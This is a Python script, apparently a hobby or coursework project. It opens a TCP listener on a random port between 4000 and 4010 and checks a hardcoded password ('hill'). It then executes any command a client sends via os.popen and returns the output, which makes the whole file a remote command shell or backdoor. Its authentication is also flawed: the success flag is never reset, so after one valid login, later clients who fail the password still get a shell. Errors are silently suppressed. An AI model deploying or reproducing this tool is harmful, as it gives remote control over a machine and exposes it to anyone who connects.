import sys
import socket
import threading
import os
import random
import hashlib

salt = os.urandom(32)
key = hashlib.pbkdf2_hmac('sha256', 'hill'.encode('utf-8'), salt, 100000)
storage = salt + key 

RECV_BUFFER_SIZE = 2048
SEND_BUFFER_SIZE = 2048
QUEUE_LENGTH = 10

def handle_req(conn, addr):
    try:
        os.chdir(os.path.expanduser("~"))
        while True:
            data = conn.recv(RECV_BUFFER_SIZE)
            if not data: break
            output = os.popen(data.decode('utf-8')).read()
            if len(output) == 0:
                conn.sendall("No output given from command".encode('utf-8'))
            else:    
                conn.sendall(output.encode('utf-8'))
            # print("did we send the data?") Data sends correctly
    except:
        pass
    finally:
        conn.close()
            

def server(server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', server_port))
        s.listen(QUEUE_LENGTH)
        flag = False
        while True:
            conn, addr = s.accept()
            print('Connection accepted')
            for i in range(3):
                data = conn.recv(RECV_BUFFER_SIZE).decode('utf-8')
                new_key = hashlib.pbkdf2_hmac('sha256',data.encode('utf-8'), salt, 100000)
                # hashedData = str(sha256_crypt.hash(data)) #with hashing
                if new_key == key:
                    conn.sendall("SUCCESS".encode('utf-8'))
                    flag = True
                    break
                else:
                    conn.sendall("FAILURE".encode('utf-8'))
            if not flag:
                conn.sendall("CLOSED ACCESS".encode('utf-8'))
                conn.close()
                continue
                
            worker_thread = threading.Thread(target=handle_req, args=(conn, addr,))
            worker_thread.start()
    except:
        pass
    finally:
        print("Error?")
        s.close()


def main():
    """Parse command-line argument and call server function """
    if len(sys.argv) != 1:
        sys.exit("Usage: python server.py")
    ports = [4000, 4001, 4002, 4003, 4004, 4005,4006,4007,4008,4009, 4010]
    server_port = random.choice(ports)
    # server_port = 443
    print("We are on port: ", server_port)
    server(server_port)

if __name__ == "__main__":
    main()